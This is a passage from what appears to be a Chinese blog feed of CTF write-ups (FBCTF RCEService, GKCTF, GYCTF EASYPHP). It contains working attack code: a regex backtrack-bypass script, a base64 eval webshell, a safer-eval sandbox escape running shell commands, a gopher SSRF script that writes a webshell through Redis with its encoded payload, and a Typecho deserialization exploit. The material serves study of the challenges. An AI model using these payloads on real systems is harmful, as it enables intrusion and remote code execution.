class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题注意这里：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>所以我们想要执行命令的话必须通过/bin/cat来执行系统命令（本人不是很能明白原因。。）</p>
<p>正则绕过，这里可以通过P牛大佬的文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;use-pcre-backtrack-limit-to-bypass-restrict.html</span><br></pre></td></tr></table></figure>

<p>阅读P牛大佬的文章，大致意思是，PHP的正则并不是通过根据正则的匹配来决定下一步的，如果满足条件的话，正则便会无限的向后匹配，直到末尾之后，如果正则没有能够成功匹配结尾，就会往回回溯，来查找到满足条件的情况</p>
<p><img src="FBCTF2018RCEService/image-20201117154441800.png" alt="image-20201117154441800"></p>
<p>类似P牛大佬的例子，如果按照我们的思路的话，当匹配到 ;的时候，已经匹配成功，所以就应该停下来了，但是由于.*可以匹配任意，故我们会一直匹配到最后一步，但此时正则没有匹配成功，就会往前推，直到正则匹配成功。</p>
<p>又因为P牛师傅说的，只要回溯100000此就会失败，所以我们发送一串超级长的字符串即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"></span><br><span class="line">params = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;123&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">params = &#123;<span class="string">&quot;cmd&quot;</span>:params&#125;</span><br><span class="line">url = <span class="string">&quot;http://e23f7266-20a3-4aa0-bfbc-8a9502764002.node3.buuoj.cn&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>注意这里一定要发送post包，get包无法接受这么长的参数，传过去就可以得到flag了</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF</title>
    <url>/2020/10/27/GKCTF/</url>
    <content><![CDATA[<p>抽空把GKCTF的题目刷了，先从第一题开始说吧</p>
<h1 id="1-Check-in"><a href="#1-Check-in" class="headerlink" title="1.Check in"></a>1.Check in</h1><p>说是一道签到题，但是得用到pwn的知识【虽然exp直接就能打了</p>
<p>第一步访问就能审计到代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就是一个很简单的序列化，我们直接base64编码Ginkgo之后的值即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<p>审计到PHP的代码，下一步我们会发现自己蚁剑连接不上，没办法，只能自己再写一个shell了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA==</span><br></pre></td></tr></table></figure>

<p>密码是sakani，之后就可以用蚁剑链接上去了，但是我们发现flag没法读啊。而且因为disable_function，我们 没有办法使用虚拟终端了。</p>
<p>但是我们查看版本，版本为PHP7.3，可以尝试用内核漏洞提权，在tmp目录（777），上传exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//github.com/mm0r1/exploits</span></span><br></pre></td></tr></table></figure>

<p>上传这里的gc漏洞，之后执行命令即可</p>
<h1 id="2-老八小超市儿"><a href="#2-老八小超市儿" class="headerlink" title="2.老八小超市儿"></a>2.老八小超市儿</h1><p>根据这篇文章可以做出来前半段成功拿到shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html</span><br></pre></td></tr></table></figure>

<p>这里我传入成功之后路径为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p>用蚁剑连入，根目录下找到flag却不能读，读atuo.sh可以知道它每分钟会执行一次makeflaghint.py，同时其权限是766，也就是说我们可以改~，那我们去改这个py的内容让他读flag即可，等一分钟，读到flag</p>
<h1 id="3-EzNode"><a href="#3-EzNode" class="headerlink" title="3.EzNode"></a>3.EzNode</h1><p>就是一个很基础的代码审计：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意核心代码在worker2到worker3之间，我们发现如果delay被设置成了60*1000</p>
<p>而超时是1000.如果没有超时，反而会next，也就是会继续执行代码，否则直接弹回去超时，于是我们看下一步</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面使用了saferEval的代码，接收e的参数，于是我们的目标很清晰，首先尝试绕过对超时的限制，再搜一下saferEval的数据~，文档说到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseInt(string, radix)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">string</td>
<td align="left">必需。要被解析的字符串。</td>
</tr>
<tr>
<td align="left">radix</td>
<td align="left">可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。</td>
</tr>
</tbody></table>
<p>这也就说明，如果传入delay是很大很大的数，也就不能被解析了，那我们的delay此时变成了1秒，也就绕过了超时限制，接下来我们就可以命令执行咯，尝试：</p>
<p><img src="..%5Cimages%5Cimage-20201027214654296.png" alt="image-20201027214654296"></p>
<p>发现此时就绕过了超时的限制了！，于是再构造执行EvalSafer的代码，查到是CVE-2019-10769</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10</span><br></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&quot;./src/index&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">&quot;return process;&quot;</span>)();</span><br><span class="line">  <span class="keyword">return</span> process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure>

<p>其中核心代码就是theFunction，我们传入进去污染参数即可执行代码</p>
<p><img src="image-20201028121332238.png" alt="image-20201028121332238"></p>
<h1 id="4-EzWeb"><a href="#4-EzWeb" class="headerlink" title="4.EzWeb"></a>4.EzWeb</h1><p>是一个redis的题目..没有做过这样的，硬着头皮做吧，访问之后根据提示访问 ?secret</p>
<p><img src="image-20201028124819584.png" alt="image-20201028124819584"></p>
<p>查询了一些，这是内网的环境，也就是说虽然题目过滤了127.0.0.1,但是我们可以测试其他靶机的内容</p>
<p><img src="image-20201028125140003.png" alt="image-20201028125140003"></p>
<p>访问过去之后好像也不是啥玩意儿啊,尝试用file协议的漏洞读到了index.php的源码：</p>
<p>file:[空格]/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;提交</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--?secret--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们发现过滤了dict协议，file协议，但是没有过滤http协议和gopher协议，我们猜想出题人想让我们利用http协议进行内网探测，gopher协议进行攻击,果然，在11端口上找到了变化</p>
<p><img src="image-20201028132212757.png" alt="image-20201028132212757"></p>
<p>让我们尝试服务，因为ssrf常用的几个服务就是mysql和redis，于是分别访问3306端口和6379端口</p>
<p>6379上得到：</p>
<p><img src="image-20201028132532651.png" alt="image-20201028132532651"></p>
<p>发现果然有ERR端口，于是尝试用gopher协议打一波，这里直接用了一波别人的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.96.119.11&quot;</span>      // 运行有redis的主机ip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们改一下主机IP为:10.160.187.11</p>
<p>得到payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>

<h1 id="5-EZ三剑客-EzTypecho"><a href="#5-EZ三剑客-EzTypecho" class="headerlink" title="5.EZ三剑客-EzTypecho"></a>5.EZ三剑客-EzTypecho</h1><p>这道题目，呃，原理比较难，但是利用起来却很简单，比如在这篇文章中可以找到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html</span><br></pre></td></tr></table></figure>

<p>exp就可以找到了，在做题的时候直接在finish时会发现无法利用的情况</p>
<p><img src="image-20201028171811386.png" alt="image-20201028171811386"></p>
<p>这个时候就必须看源码了</p>
<p>查找session，在源码中可以找到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></span><br><span class="line">               <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no, you can\&#x27;t unserialize it without session QAQ&#x27;</span>);&#125;</span><br><span class="line">               $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">               Typecho_Cookie::delete(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line">               $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">&#x27;adapter&#x27;</span>], $config[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">               $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">               Typecho_Db::set($db);</span><br><span class="line">               <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们去查找sesion在哪里赋值：</p>
<p><img src="image-20201028172113525.png" alt="image-20201028172113525"></p>
<p>结果发现一旦在这里就被exit停下来了，于是查找start，结果发现源码当中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                        $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">                        $type = explode(<span class="string">&#x27;_&#x27;</span>, $config[<span class="string">&#x27;adapter&#x27;</span>]);</span><br><span class="line">                        $type = array_pop($type);</span><br></pre></td></tr></table></figure>

<p>发现它居然接收一个参数…那这样的话我们用这个去打就行了，利用脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">&quot;RSS 2.0&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;link&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="string">&quot;20190430&quot;</span>,</span><br><span class="line">                <span class="string">&quot;author&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;screenName&quot;</span> =&gt; <span class="string">&quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">&quot;assert&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;adapter&quot;</span> =&gt; $a,</span><br><span class="line">    <span class="string">&quot;prefix&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>

<p>拿到flag：</p>
<p><img src="image-20201028172325171.png" alt="image-20201028172325171"></p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>​    题目虽然原理都很难，但是利用却很简单，自己先把题目成功的复现接出来了，以后再逐步复现原理把。</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>反序列化</tag>
        <tag>php</tag>
        <tag>渗透</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF_EASYPHP</title>
    <url>/2020/12/11/GYCTF-EASYPHP/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
<li>反序列化逃逸</li>
<li>POP链</li>
</ul>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目可以dump下来www下的PHP文件，在update.php下面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即使登陆没有成功也执行了update()这个函数，所以要说漏洞肯定就是在这里了，重点在lib.php这里，所以我们要尝试check这儿，先看update函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看这里反序列化了getNewInfo函数，查看这个函数跟进</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接收了两个参数，之后调用safe函数，并且序列化了它，那么去找safe函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接将不满6的东西变成了hack，有问题，这里可以造成反序列化逃逸。这是一个正常的更新流程，但很明显我们不应该跟着他的思路去走，因为有了反序列化逃逸，<strong>所以nickname我们可以任意控制</strong>，</p>
<p>我们在getNewInfo这里可以看见new了一个info类，inFo类这里很明显除了__construct之外还有有个call。那么题目应该是想让我们控制任意的sql语句查询-&gt;得到一个恒为真的结果-&gt;登陆成功。</p>
<p>回到题目这里的情况设想下，无论登陆成功与否，都会尝试执行update函数，update函数这里new了UpdateHelper类，在类被销毁的时候输出了$this-&gt;sql</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020_EasyThinking</title>
    <url>/2021/03/25/GYCTF2020-EasyThinking/</url>
    <content><![CDATA[<p><a href="http://www.zip/">www.zip</a> 可以下载源码</p>
